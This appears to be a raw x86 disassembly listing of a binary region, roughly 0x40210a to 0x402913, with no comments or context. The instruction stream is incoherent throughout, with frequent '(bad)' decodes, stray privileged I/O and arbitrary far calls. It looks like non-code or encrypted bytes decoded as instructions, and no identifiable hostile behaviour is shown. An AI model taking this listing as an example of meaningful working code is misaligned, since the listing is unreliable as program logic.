  40210a:	ret    0x3f0f
  40210d:	pop    edi
  40210e:	out    0x89,al
  402110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402111:	pop    edi
  402112:	(bad)
  402117:	adc    eax,0x76ff82c9
  40211c:	mov    ds:0x291a4aba,al
  402121:	mov    bh,ch
  402123:	shl    BYTE PTR [eax],1
  402125:	mov    eax,ds:0xf7021010
  40212a:	mov    ebp,es
  40212c:	and    al,BYTE PTR [edi-0x259188a5]
  402132:	jg     0x4020be
  402134:	dec    ebp
  402135:	sub    eax,0x42c8c833
  40213a:	or     DWORD PTR ds:0xcebfe96d,esi
  402140:	mov    edx,0x76106b2a
  402145:	ficomp DWORD PTR [edi+ebx*8-0x4d75b8a]
  40214c:	dec    ch
  40214e:	imul   BYTE PTR [ebx-0x1b8eb5ef]
  402154:	fadd   st,st(2)
  402156:	sahf   
  402157:	repz ror DWORD PTR es:[ecx-0x7c],1
  40215c:	mov    ?,WORD PTR [ebp+edx*8-0x4f]
  402160:	mov    DWORD PTR [esi-0x68],ecx
  402163:	(bad)  
  402164:	int    0xde
  402166:	dec    BYTE PTR [edx]
  402168:	es jns 0x40215a
  40216b:	popa   
  40216c:	push   0xffffffc5
  40216e:	add    eax,DWORD PTR [ebp+0x42b99f90]
  402174:	mov    al,0x18
  402176:	test   al,0x58
  402178:	pop    ebp
  402179:	fstp   DWORD PTR ds:0x282abea8
  40217f:	fsubr  QWORD PTR [esi]
  402181:	sbb    ecx,0xd
  402184:	cmp    eax,0x24d23d3e
  402189:	call   0xd115fee5
  40218e:	add    bl,BYTE PTR [bx]
  402191:	repz ss int3 
  402194:	sahf   
  402195:	dec    esi
  402196:	pop    ebx
  402197:	mov    edi,ds
  402199:	pop    esi
  40219a:	add    eax,0xd3a2a9a4
  40219f:	cmp    DWORD PTR [ecx+edx*8+0x3b14657d],ecx
  4021a6:	(bad)  
  4021a7:	push   esp
  4021a8:	pop    ebx
  4021a9:	pop    edi
  4021aa:	and    BYTE PTR [ebx],bl
  4021ac:	gs push 0xfffffffd
  4021af:	sahf   
  4021b0:	xchg   ebp,eax
  4021b1:	std    
  4021b2:	xor    eax,0x3eda299c
  4021b7:	test   ax,0x68e
  4021bb:	mov    dl,0xb
  4021bd:	pop    edi
  4021be:	fcom   QWORD PTR [esi]
  4021c0:	and    al,0xde
  4021c2:	xor    BYTE PTR [eax],0xfa
  4021c5:	cmp    ah,dh
  4021c7:	sub    DWORD PTR [edx+0x6df1104e],eax
  4021cd:	ja     0x4021ce
  4021cf:	cmc    
  4021d0:	enter  0xe7e7,0xb
  4021d4:	xor    ebp,esi
  4021d6:	in     al,dx
  4021d7:	mov    edx,ebx
  4021d9:	shl    DWORD PTR ds:0xf49e2c0f,cl
  4021df:	pop    ss
  4021e0:	jp     0x402203
  4021e2:	jl     0x402250
  4021e4:	adc    al,0xda
  4021e6:	js     0x40220d
  4021e8:	fwait
  4021e9:	pop    es
  4021ea:	sub    ecx,DWORD PTR [ebx]
  4021ec:	adc    BYTE PTR [edi+0x7d],al
  4021ef:	sub    edx,esp
  4021f1:	xchg   esp,eax
  4021f2:	or     BYTE PTR [ecx+0x3d],bh
  4021f5:	push   ebp
  4021f6:	test   DWORD PTR [edx+0x17f56905],esp
  4021fc:	push   cs
  4021fd:	mov    eax,0x4237fa58
  402202:	aaa    
  402203:	daa    
  402204:	enter  0xd34,0x88
  402208:	es scas eax,DWORD PTR es:[edi]
  40220a:	or     DWORD PTR [edx+0x6c],ebp
  40220d:	icebp  
  40220e:	push   0xffffffac
  402210:	cld    
  402211:	push   ebx
  402212:	mov    ch,0x5e
  402214:	call   0x2107:0x2fbab88b
  40221b:	cmp    eax,0x5fdc4b4d
  402220:	fsub   DWORD PTR [edx]
  402222:	or     esi,DWORD PTR [ebp+eiz*4-0x186657a7]
  402229:	loopne 0x402292
  40222b:	cmp    BYTE PTR [edi+0x63ed4736],dl
  402231:	(bad)  
  402232:	dec    edx
  402233:	fidiv  DWORD PTR [edi-0x72]
  402236:	add    eax,0xe6e55890
  40223b:	(bad)  
  40223c:	outs   dx,BYTE PTR ds:[esi]
  40223d:	ja     0x402238
  40223f:	add    esi,DWORD PTR [ecx+0x7b627fc5]
  402245:	add    al,0xed
  402247:	jnp    0x4021dd
  402249:	aam    0x5a
  40224b:	aam    0x22
  40224d:	cmc    
  40224e:	or     eax,0x9d5d7712
  402253:	data16 (bad) 
  402255:	pop    eax
  402256:	(bad)  
  402258:	idiv   BYTE PTR [esi]
  40225a:	rcl    DWORD PTR [esi-0x1e],1
  40225d:	cs repz clc 
  402260:	stc    
  402261:	pop    esp
  402262:	jmp    0xcf2b0168
  402267:	call   0xb87f:0x65d37958
  40226e:	adc    eax,0xec3bc949
  402273:	pop    esp
  402274:	pop    ebx
  402275:	or     DWORD PTR [ebp+0x6ff81829],ebx
  40227b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40227c:	and    ebx,DWORD PTR ds:[edi+eiz*2-0x30bd5af2]
  402284:	in     eax,dx
  402285:	xchg   esp,eax
  402286:	inc    edi
  402287:	call   0xe28e3a58
  40228c:	sbb    al,0x7f
  40228e:	dec    ebx
  40228f:	out    dx,eax
  402290:	add    ah,BYTE PTR [eax+ebp*2-0x41b32d80]
  402297:	sub    DWORD PTR [ebp+0x1f],0xffffffc0
  40229b:	(bad)  
  40229c:	cs xchg ecx,eax
  40229e:	mov    eax,DWORD PTR [edx-0x3248751b]
  4022a4:	lods   al,BYTE PTR ds:[esi]
  4022a5:	cmp    dh,BYTE PTR [edi]
  4022a7:	sub    bh,bl
  4022a9:	mov    eax,ds:0x9eb3e81
  4022ae:	push   ds
  4022af:	mov    DWORD PTR [ebx],ecx
  4022b1:	cld    
  4022b2:	std    
  4022b3:	sbb    eax,0xd31902d4
  4022b8:	jno    0x402248
  4022ba:	adc    BYTE PTR [ebx+0x26273258],ah
  4022c0:	(bad)  
  4022c1:	jo     0x402269
  4022c3:	pop    ebx
  4022c4:	das    
  4022c5:	popf   
  4022c6:	inc    eax
  4022c7:	pop    edx
  4022c8:	arpl   WORD PTR [esi],ax
  4022ca:	fst    QWORD PTR ds:0xdbe6d614
  4022d0:	pop    ebp
  4022d1:	mov    eax,ds:0x7c376065
  4022d6:	les    ecx,FWORD PTR [eax]
  4022d8:	sub    ch,BYTE PTR [edi-0x62]
  4022db:	pop    ecx
  4022dc:	hlt    
  4022dd:	(bad)  
  4022de:	or     esp,ebx
  4022e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022e1:	hlt    
  4022e2:	mov    esi,edx
  4022e4:	test   DWORD PTR [esi-0x500a4c72],esi
  4022ea:	sub    bl,ch
  4022ec:	mov    esi,0xfea27994
  4022f1:	sub    eax,0x5156c614
  4022f6:	inc    ecx
  4022f7:	jnp    0x402281
  4022f9:	int3   
  4022fa:	push   es
  4022fb:	mov    al,ds:0x2ed60003
  402300:	sbb    BYTE PTR [ecx+0x69],ah
  402303:	ds loope 0x4022fb
  402306:	pop    esi
  402307:	add    DWORD PTR [edi-0x6f2f7539],edx
  40230d:	aad    0x4e
  40230f:	jge    0x4022d9
  402311:	push   cs
  402312:	jae    0x40235b
  402314:	gs dec esp
  402316:	mov    ch,al
  402318:	lock dec ebp
  40231a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40231b:	imul   ecx,DWORD PTR [esi],0xad97540a
  402321:	in     al,dx
  402322:	imul   ebp,DWORD PTR [ecx-0x259e08ca],0x14
  402329:	mov    ecx,0xa1994a9d
  40232e:	push   cs
  40232f:	or     BYTE PTR [ebp+0x4f99acd1],0x7a
  402336:	daa    
  402337:	adc    ecx,DWORD PTR [edi-0x76b06b6d]
  40233d:	(bad)  
  40233e:	icebp  
  40233f:	lods   eax,DWORD PTR ds:[esi]
  402340:	add    al,0x52
  402342:	cli    
  402343:	inc    ebx
  402344:	mov    dh,0x39
  402346:	jmp    0x4023bf
  402348:	in     al,0x3f
  40234a:	ficom  DWORD PTR [esi+0x7c3319bf]
  402350:	cwde   
  402351:	fsubr  QWORD PTR [esi-0x6b]
  402354:	mov    ch,0x60
  402356:	ja     0x4023c6
  402358:	inc    esp
  402359:	mov    edi,ecx
  40235b:	nop
  40235c:	mov    al,ds:0x942cb82f
  402361:	in     al,dx
  402362:	add    al,0xaa
  402364:	sti    
  402365:	(bad)  
  402366:	jo     0x402366
  402368:	call   0x45f2ab3f
  40236d:	mov    bh,0xe9
  40236f:	pop    ds
  402370:	mov    esi,0xf82b365d
  402375:	pop    esp
  402376:	arpl   WORD PTR [ebp+0x1cdd8069],dx
  40237c:	stos   BYTE PTR es:[edi],al
  40237d:	sbb    eax,0x19083741
  402382:	aas    
  402383:	aaa    
  402384:	imul   ebx,DWORD PTR [ebx+0x74b37bf2],0xffffffbd
  40238b:	jnp    0x402359
  40238d:	outs   dx,BYTE PTR ds:[esi]
  40238e:	arpl   WORD PTR [ebx],sp
  402390:	xlat   BYTE PTR ds:[ebx]
  402391:	retf   0x667
  402394:	xchg   esi,eax
  402395:	leave  
  402396:	test   al,0xd8
  402398:	(bad)  
  40239a:	in     al,0x4a
  40239c:	or     al,0x17
  40239e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40239f:	sub    BYTE PTR [ecx],dl
  4023a1:	inc    esi
  4023a2:	cdq    
  4023a3:	(bad)  
  4023a4:	out    dx,eax
  4023a5:	jmp    0x40235d
  4023a7:	aaa    
  4023a8:	push   ss
  4023a9:	sub    DWORD PTR [ecx+0x4d],0xae5b9102
  4023b0:	mov    edi,0xa37f9e82
  4023b5:	cdq    
  4023b6:	in     eax,dx
  4023b7:	in     al,0xff
  4023b9:	jge    0x4023e7
  4023bb:	dec    edi
  4023bc:	inc    ebx
  4023bd:	(bad)  
  4023be:	in     eax,dx
  4023bf:	cmp    ch,bh
  4023c1:	jne    0x402437
  4023c3:	jne    0x402399
  4023c5:	mov    bl,0x37
  4023c7:	test   DWORD PTR [eax+0x409c4d6e],esi
  4023cd:	pop    es
  4023ce:	mov    bh,0xff
  4023d0:	mov    WORD PTR [edx+0x2d5a0d78],ds
  4023d6:	adc    esp,0xfffffff8
  4023d9:	test   eax,0x157965ba
  4023de:	outs   dx,BYTE PTR ds:[esi]
  4023df:	(bad)  
  4023e0:	pop    ss
  4023e1:	xor    bh,0x2e
  4023e4:	scas   eax,DWORD PTR es:[edi]
  4023e5:	push   ebp
  4023e6:	fisub  DWORD PTR [edi-0x2d]
  4023e9:	arpl   WORD PTR [edi-0x5933b414],ax
  4023ef:	call   DWORD PTR [eax]
  4023f1:	and    esi,esp
  4023f3:	ins    DWORD PTR es:[edi],dx
  4023f4:	pop    ebp
  4023f5:	test   eax,0xe38ac778
  4023fa:	push   ss
  4023fb:	outs   dx,DWORD PTR ds:[esi]
  4023fc:	bound  ecx,QWORD PTR [edx+0x4e]
  4023ff:	sbb    edx,edi
  402401:	cs push esi
  402403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402404:	(bad)  
  402405:	bswap  ecx
  402407:	push   esp
  402408:	pop    edx
  402409:	inc    edi
  40240a:	pop    ebx
  40240b:	test   al,0x70
  40240d:	out    dx,eax
  40240e:	out    0x39,eax
  402410:	sub    ch,ah
  402412:	xchg   edx,eax
  402413:	in     eax,0xd0
  402415:	sub    DWORD PTR [esi+0x46],esi
  402418:	pop    ebx
  402419:	inc    edx
  40241a:	pushf  
  40241b:	ins    DWORD PTR es:[edi],dx
  40241c:	push   edx
  40241d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40241e:	into   
  40241f:	js     0x40243d
  402421:	daa    
  402422:	xchg   dl,cl
  402424:	je     0x40244e
  402426:	test   BYTE PTR [edx+0x6d088dcf],0xcc
  40242d:	ficomp DWORD PTR [edi+0x4b]
  402430:	mov    BYTE PTR [edi-0xf],bl
  402433:	sub    eax,0xf684dbf1
  402438:	fld    QWORD PTR [ecx-0xb67bcbc]
  40243e:	dec    ecx
  40243f:	nop
  402440:	sub    eax,0x8321c532
  402445:	test   DWORD PTR [edx-0x60],edx
  402448:	push   edx
  402449:	inc    esi
  40244a:	pop    es
  40244b:	sub    ah,BYTE PTR [esi+0x2627faaf]
  402451:	vandnps ymm6,ymm1,YMMWORD PTR [ecx-0x5f9814b5]
  402459:	and    bh,BYTE PTR [ebx]
  40245b:	imul   ebp,DWORD PTR [ebp-0x23cb6cd],0x518da37c
  402465:	dec    ecx
  402466:	pop    esp
  402467:	sahf   
  402468:	out    dx,al
  402469:	xchg   ebp,eax
  40246a:	js     0x402468
  40246c:	dec    esp
  40246d:	push   edi
  40246e:	test   BYTE PTR [ecx-0x79],ah
  402471:	jns    0x40243c
  402473:	add    eax,0x3c973115
  402478:	mov    ecx,0x70aa8141
  40247d:	add    BYTE PTR [edi+0x510e726e],dh
  402483:	outs   dx,DWORD PTR ds:[esi]
  402484:	stc    
  402485:	fdivr  QWORD PTR [ebp+0x307ee72b]
  40248b:	repz mov ch,0x9
  40248e:	into   
  40248f:	call   0x999e7ffd
  402494:	nop    DWORD PTR [ebx-0x7e38f429]
  40249b:	mov    bl,0x1
  40249d:	mov    ecx,0x9853abc7
  4024a2:	dec    edi
  4024a3:	and    al,0x21
  4024a5:	mov    eax,ds
  4024a7:	xchg   BYTE PTR [esp+edx*4],cl
  4024aa:	or     edi,ecx
  4024ac:	add    eax,0xbf6d9bde
  4024b1:	cdq    
  4024b2:	scas   al,BYTE PTR es:[edi]
  4024b3:	popa   
  4024b4:	mov    esi,0x9b8cc626
  4024b9:	hlt    
  4024ba:	cmc    
  4024bb:	pushf  
  4024bc:	lds    ecx,FWORD PTR [ebp-0x62]
  4024bf:	cmp    edi,DWORD PTR [edi+0x65bf0613]
  4024c5:	mov    ds:0xb47eaa70,al
  4024ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024cb:	jge    0x4024b5
  4024cd:	mov    dh,BYTE PTR [ebx-0x5f]
  4024d0:	loopne 0x40248c
  4024d2:	jae    0x402505
  4024d4:	lea    eax,[ecx+esi*8+0x249e667a]
  4024db:	mov    ah,0x69
  4024dd:	jle    0x402476
  4024df:	mov    eax,ds:0x3de231c8
  4024e4:	jmp    0xa3dcd554
  4024e9:	stc    
  4024ea:	add    esp,DWORD PTR [ebp-0x61072507]
  4024f0:	mov    ebx,0x2b0b9450
  4024f5:	int3   
  4024f6:	add    DWORD PTR [ebp*4-0x2b6cce3b],esp
  4024fd:	popa   
  4024fe:	add    eax,0x739287b0
  402503:	(bad)  
  402504:	jle    0x4024c2
  402506:	int    0x69
  402508:	push   esi
  402509:	sbb    BYTE PTR ds:0x2b63805a,dh
  40250f:	push   esp
  402510:	mov    ah,0xd8
  402512:	mov    cl,ah
  402514:	jmp    edi
  402516:	ror    eax,cl
  402518:	add    eax,0xfe8d7378
  40251d:	retf   0x3aa0
  402520:	into   
  402521:	out    dx,eax
  402522:	adc    ebp,DWORD PTR [ecx+eax*4+0x36]
  402526:	adc    al,0x40
  402528:	jno    0x4024ba
  40252a:	cmp    bh,BYTE PTR [ebp+0x30]
  40252d:	cmc    
  40252e:	mov    edi,0x96e04056
  402533:	cli    
  402534:	pop    ecx
  402535:	clc    
  402536:	sub    DWORD PTR [esi],edx
  402538:	aad    0xe0
  40253a:	adc    al,0x36
  40253c:	pop    es
  40253d:	xor    al,0xe2
  40253f:	xor    DWORD PTR [edx+0x63],0xbcb46b7d
  402546:	addr16 in eax,0x92
  402549:	mov    eax,ds:0x77641182
  40254e:	(bad)
  402551:	jmp    0x402596
  402553:	and    cl,BYTE PTR [ebx+edi*2-0x2c]
  402557:	pop    edx
  402558:	loope  0x40255f
  40255a:	xchg   DWORD PTR [eax+0xb82527c],esp
  402560:	pop    edx
  402561:	cli    
  402562:	(bad)  
  402563:	mov    esi,0x24506d9b
  402568:	pop    esp
  402569:	mov    edx,0xc6ff7f80
  40256e:	sbb    esp,DWORD PTR [esi+0xdc8a0ce]
  402574:	mov    ebx,0x4b5394f8
  402579:	mov    BYTE PTR [edx+ebp*8-0x70799875],ah
  402580:	lea    esi,[esi]
  402582:	jge    0x4025f3
  402584:	cs push 0xffffff83
  402587:	loop   0x402539
  402589:	dec    edx
  40258a:	dec    edx
  40258b:	sbb    eax,0x766c07dc
  402590:	cwde   
  402591:	mov    eax,ds:0x1f0c4953
  402596:	test   al,0x87
  402598:	add    ecx,DWORD PTR ds:0xd12617ef
  40259e:	in     al,0xcc
  4025a0:	(bad)  
  4025a1:	cmp    ch,BYTE PTR [ebp+0x37]
  4025a4:	nop
  4025a5:	ds popf 
  4025a7:	loopne 0x40261e
  4025a9:	lods   eax,DWORD PTR ds:[esi]
  4025aa:	push   0x3b
  4025ac:	mov    eax,ds:0x8af46259
  4025b1:	xchg   ecx,eax
  4025b2:	or     al,0x8c
  4025b4:	sbb    ch,dl
  4025b6:	test   al,0xf6
  4025b8:	stos   DWORD PTR es:[edi],eax
  4025b9:	mov    cl,0x36
  4025bb:	and    al,0x8a
  4025bd:	push   0x63
  4025bf:	jb     0x4025c6
  4025c1:	add    al,0x6
  4025c3:	aad    0x20
  4025c5:	adc    ebp,0x3
  4025c8:	and    al,0x6f
  4025ca:	mov    ebx,0xf613ff23
  4025cf:	xchg   ecx,eax
  4025d0:	cli    
  4025d1:	and    ecx,ecx
  4025d3:	call   0x51f003a5
  4025d8:	test   eax,0xffaacc08
  4025dd:	mov    BYTE PTR [edx],al
  4025df:	mov    ds:0x67843b53,eax
  4025e4:	es adc ecx,esi
  4025e7:	out    0x8c,eax
  4025e9:	add    eax,0x87a1e3dd
  4025ee:	fxch   st(4)
  4025f0:	shr    eax,cl
  4025f2:	es stos BYTE PTR es:[edi],al
  4025f4:	test   BYTE PTR [edi-0x3d],ah
  4025f7:	cmp    DWORD PTR [ecx+esi*8-0x474a14ee],ebp
  4025fe:	fs jl  0x402633
  402601:	add    ch,bh
  402603:	xchg   esi,eax
  402604:	ins    DWORD PTR es:[edi],dx
  402605:	ins    DWORD PTR es:[edi],dx
  402606:	adc    DWORD PTR [esi],ecx
  402608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402609:	adc    DWORD PTR [edi],eax
  40260b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40260c:	mov    ecx,0x5ee0abd9
  402611:	jnp    0x4025ce
  402613:	ret    0x2a9d
  402616:	bt     edi,ebx
  402619:	mov    ebp,edi
  40261b:	mov    ebp,0x9e5fb6dc
  402620:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402621:	xchg   edi,eax
  402622:	lock sub eax,0x30ece64
  402628:	imul   edi,DWORD PTR [edx+ebx*2-0x6a],0x22
  40262d:	mov    esi,0x81e3d94b
  402633:	addr16 gs out dx,eax
  402636:	int    0x4f
  402638:	sub    DWORD PTR [edi+0x6b66baa9],ecx
  40263e:	xchg   edi,eax
  40263f:	xor    BYTE PTR [edx+ebp*2+0x4f],bh
  402643:	retf   
  402644:	cmp    eax,0x73e04d88
  402649:	xchg   ebp,eax
  40264a:	and    BYTE PTR [ecx+0x5e632c12],al
  402650:	and    eax,0xbd546bb6
  402655:	dec    ebx
  402656:	lods   al,BYTE PTR ds:[esi]
  402657:	mov    esp,0xe0024764
  40265c:	fnstenv ds:0x3856782c
  402662:	xor    eax,0x98cebca6
  402667:	rol    BYTE PTR [ebx+0x46],cl
  40266a:	shl    BYTE PTR [edi+ecx*2+0x3b2e0ef2],cl
  402671:	mov    dl,0x1e
  402673:	ret    0xece3
  402676:	ins    DWORD PTR es:[edi],dx
  402677:	adc    edx,DWORD PTR [esi+0x25944628]
  40267d:	cdq    
  40267e:	je     0x402690
  402680:	out    0x3b,al
  402682:	xchg   dl,dh
  402684:	scas   al,BYTE PTR es:[edi]
  402685:	ret    
  402686:	test   al,0xc2
  402688:	lods   eax,DWORD PTR ds:[esi]
  402689:	ret    0xe4c3
  40268c:	pop    esp
  40268d:	push   ss
  40268e:	sbb    esi,DWORD PTR [edi+0x1bee2485]
  402694:	fistp  QWORD PTR [ecx+0x794baaa4]
  40269a:	out    dx,eax
  40269b:	jmp    DWORD PTR [esp+edi*2+0x4e68b8c5]
  4026a2:	xor    esp,ebx
  4026a4:	idiv   DWORD PTR [ebp+0x38]
  4026a7:	int3   
  4026a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026aa:	add    al,0xc3
  4026ac:	pop    ss
  4026ad:	(bad)  
  4026ae:	cmp    cl,BYTE PTR [edx-0x2b]
  4026b1:	call   0xf9f2d354
  4026b6:	jbe    0x402674
  4026b8:	fmul   st,st(5)
  4026ba:	cdq    
  4026bb:	sbb    eax,0x5ecfc5c7
  4026c0:	push   0x905e4bd5
  4026c5:	dec    edx
  4026c6:	cbw    
  4026c8:	cdq    
  4026c9:	pop    ds
  4026ca:	popf   
  4026cb:	(bad)  
  4026cc:	les    esi,FWORD PTR fs:[ecx-0x6b]
  4026d0:	pop    edi
  4026d1:	retf   
  4026d2:	stos   BYTE PTR es:[edi],al
  4026d3:	jp     0x402695
  4026d5:	dec    edi
  4026d6:	ja     0x4026d2
  4026d8:	scas   al,BYTE PTR es:[edi]
  4026d9:	call   DWORD PTR [ebp+0x70]
  4026dc:	out    0xf9,eax
  4026de:	sub    dl,dh
  4026e0:	xor    ch,BYTE PTR [eax-0x1e]
  4026e3:	nop
  4026e4:	mov    eax,0xd61c8133
  4026e9:	and    BYTE PTR [ecx-0x12],dl
  4026ec:	mov    ds:0xbb17a292,eax
  4026f1:	jg     0x40272b
  4026f3:	jmp    0x33d96e60
  4026f8:	mov    BYTE PTR [ecx+0xd],dh
  4026fb:	sub    DWORD PTR [ebp+edi*4+0x69],0x15
  402700:	es jnp 0x40268f
  402703:	xlat   BYTE PTR ds:[ebx]
  402704:	in     al,0x2b
  402706:	mov    cl,BYTE PTR [ebp-0x637b1e9f]
  40270c:	or     bl,BYTE PTR [edi-0x3b26c85c]
  402712:	dec    esp
  402713:	xor    BYTE PTR ds:0xf768b102,ah
  402719:	jb     0x40277f
  40271b:	sub    eax,0x36149371
  402720:	xor    cl,BYTE PTR [esi-0x2969cdf8]
  402726:	mov    ds:0x9c05ab64,eax
  40272b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40272c:	adc    ebx,esi
  40272e:	test   BYTE PTR [edx+0xb],cl
  402731:	mov    ebp,0xc38784db
  402736:	sbb    cl,BYTE PTR [ebp-0x10154346]
  40273c:	fidiv  DWORD PTR [ecx+esi*1+0x18]
  402740:	cmp    DWORD PTR [ebx-0x5bb8f724],esp
  402746:	and    eax,0x7e8731e0
  40274b:	fidiv  DWORD PTR [edi]
  40274e:	rol    BYTE PTR [edi+eiz*2-0x2341df2],cl
  402755:	mov    ebx,0xcda2c683
  40275a:	enter  0xf03b,0x33
  40275e:	dec    ebx
  40275f:	mov    edi,?
  402761:	daa    
  402762:	pop    ebx
  402763:	mov    WORD PTR [edx],es
  402765:	aaa    
  402766:	pop    edx
  402767:	jb     0x4027ce
  402769:	es mov ah,0x80
  40276c:	icebp  
  40276d:	aam    0x79
  40276f:	mov    esp,0x630b5a74
  402774:	mov    DWORD PTR [esi-0x6897f5de],eax
  40277a:	popa   
  40277b:	jnp    0x40277b
  40277d:	es push 0x1768db44
  402783:	mov    WORD PTR [esi],ss
  402785:	lods   eax,DWORD PTR ds:[esi]
  402786:	rol    DWORD PTR [edx-0x32],1
  402789:	outs   dx,DWORD PTR ds:[esi]
  40278a:	mov    BYTE PTR [eax+ebp*2+0x1524a0d1],dh
  402791:	pop    ds
  402792:	sbb    al,0xbc
  402794:	adc    DWORD PTR [edi+ebp*2-0xa0a1be4],edx
  40279b:	test   BYTE PTR [esi],dl
  40279d:	enter  0xd13a,0x72
  4027a1:	int    0xef
  4027a3:	pop    ecx
  4027a4:	sahf   
  4027a5:	in     al,0x7a
  4027a7:	mov    ds:0x259b5e57,eax
  4027ac:	jns    0x40278b
  4027ae:	sbb    BYTE PTR [ecx+0x53],dh
  4027b1:	rol    BYTE PTR [edx+0xf50bec3],1
  4027b7:	int3   
  4027b8:	pop    eax
  4027b9:	and    BYTE PTR [edx],cl
  4027bb:	in     al,0x8e
  4027bd:	inc    esi
  4027be:	jp     0x402787
  4027c0:	stc    
  4027c1:	mov    al,ds:0xf2ca22d5
  4027c6:	inc    edi
  4027c7:	xor    edx,DWORD PTR [ebx+0x6451ce66]
  4027cd:	ins    BYTE PTR es:[edi],dx
  4027ce:	scas   eax,DWORD PTR es:[edi]
  4027cf:	xlat   BYTE PTR ds:[ebx]
  4027d0:	push   0xffffffa8
  4027d2:	bound  ebx,QWORD PTR [ebx-0xee67692]
  4027d8:	std    
  4027d9:	jp     0x4027fc
  4027db:	mov    dh,0x90
  4027dd:	add    BYTE PTR [ebx-0x1e991ba2],dh
  4027e3:	push   es
  4027e4:	cmp    cl,BYTE PTR [eax]
  4027e6:	adc    DWORD PTR [eax+edi*1-0x79],0xf4795a0
  4027ee:	or     BYTE PTR [ecx+0x1f],ah
  4027f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027f2:	or     al,0xf5
  4027f4:	test   eax,0xfe4e0b72
  4027f9:	in     eax,0xb2
  4027fb:	mov    ecx,DWORD PTR [edx-0x1f]
  4027fe:	lods   eax,DWORD PTR ds:[esi]
  4027ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402800:	mov    ds:0xf1ddf4cc,al
  402805:	cld    
  402806:	scas   al,BYTE PTR es:[edi]
  402807:	jno    0x402832
  402809:	pop    es
  40280a:	nop
  40280b:	and    ecx,eax
  40280d:	and    BYTE PTR [eax],bl
  40280f:	dec    ebx
  402810:	cwde   
  402811:	shl    bh,0xb3
  402814:	cmp    eax,0xe5a1b4c
  402819:	mov    bl,0x28
  40281b:	mov    edx,0x5c46425b
  402820:	stos   BYTE PTR es:[edi],al
  402821:	mov    dl,0x34
  402823:	jo     0x4027a6
  402825:	mov    bh,0xed
  402827:	arpl   WORD PTR [eax+ebp*8],cx
  40282a:	inc    ebp
  40282b:	mov    ch,0xf6
  40282d:	sbb    al,0x56
  40282f:	adc    al,0x7e
  402831:	and    ebx,DWORD PTR [edi]
  402833:	clc    
  402834:	pop    es
  402835:	gs mov dh,0xf5
  402838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402839:	cmc    
  40283a:	dec    edx
  40283b:	call   0x6dea:0x1dcc9fb6
  402842:	and    sp,WORD PTR [ecx+0x2e3a2ff9]
  402849:	stos   BYTE PTR es:[edi],al
  40284a:	xlat   BYTE PTR ds:[ebx]
  40284b:	aas    
  40284c:	xchg   DWORD PTR [ebx],ebx
  40284e:	inc    esi
  40284f:	or     ah,BYTE PTR [eax+edx*8-0x80]
  402853:	call   0x22cf:0x99535949
  40285a:	dec    ebp
  40285b:	outs   dx,BYTE PTR ds:[esi]
  40285c:	bnd js 0x402885
  40285f:	pop    ebp
  402860:	push   ds
  402861:	mov    edi,0xd31ad543
  402866:	adc    eax,DWORD PTR [ebx]
  402868:	mov    ds,WORD PTR [eax-0x79]
  40286b:	out    0x6c,al
  40286d:	repnz out dx,al
  40286f:	mov    ebp,eax
  402871:	cmp    DWORD PTR [ecx+edx*8+0x23],0xd1d3bea1
  402879:	mov    BYTE PTR [ebx],bh
  40287b:	add    al,0xee
  40287d:	(bad)
  402881:	pop    ecx
  402882:	lods   eax,DWORD PTR ds:[esi]
  402883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402884:	icebp  
  402885:	and    BYTE PTR [eax-0x5d2b0e96],bl
  40288b:	dec    BYTE PTR [edi]
  40288d:	mov    ds:0x68b96219,eax
  402892:	inc    eax
  402893:	lds    edi,FWORD PTR [edi]
  402895:	xor    bh,dh
  402897:	ror    bh,0x67
  40289a:	(bad)  
  40289b:	shl    BYTE PTR [ebp+0x79785410],cl
  4028a1:	out    dx,al
  4028a2:	out    dx,al
  4028a3:	adc    dl,bl
  4028a5:	mov    edx,0x310ea8bd
  4028aa:	ss pop ebp
  4028ac:	pop    edi
  4028ad:	xchg   ecx,eax
  4028ae:	add    BYTE PTR [edi+0x37],0xd2
  4028b2:	ds jnp 0x4028f0
  4028b5:	and    edi,esp
  4028b7:	(bad)  
  4028b8:	and    ecx,DWORD PTR [esi]
  4028ba:	pop    esi
  4028bb:	sbb    al,0x40
  4028bd:	addr16 test al,0x68
  4028c0:	imul   ecx,DWORD PTR [ebx+0x45],0xbd24623
  4028c7:	daa    
  4028c8:	ror    BYTE PTR [edi],1
  4028ca:	adc    BYTE PTR [eax-0x43e4f71f],cl
  4028d0:	jae    0x4028a5
  4028d2:	add    eax,0x29ba32bd
  4028d7:	clc    
  4028d8:	sub    al,0xb7
  4028da:	inc    ebx
  4028db:	add    edi,ecx
  4028dd:	daa    
  4028de:	dec    eax
  4028df:	addr16 xor edx,ebp
  4028e2:	mov    al,BYTE PTR [esp+edi*2-0x7827b79c]
  4028e9:	loop   0x402912
  4028eb:	btc    DWORD PTR [edi+0xe87e32f],0xeb
  4028f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028f4:	int3   
  4028f5:	add    eax,0xc74887f6
  4028fa:	sar    BYTE PTR [eax+0x780f4971],1
  402900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402901:	adc    ebx,DWORD PTR [ebx+0x44ccf891]
  402907:	inc    eax
  402908:	out    dx,al
  402909:	lods   eax,DWORD PTR ds:[esi]
  40290a:	mov    cl,0x6c
  40290c:	inc    eax
  40290d:	jecxz  0x40289a
  40290f:	jne    0x40297e
  402911:	jecxz  0x402919
  402913:	cmp    al,0xc
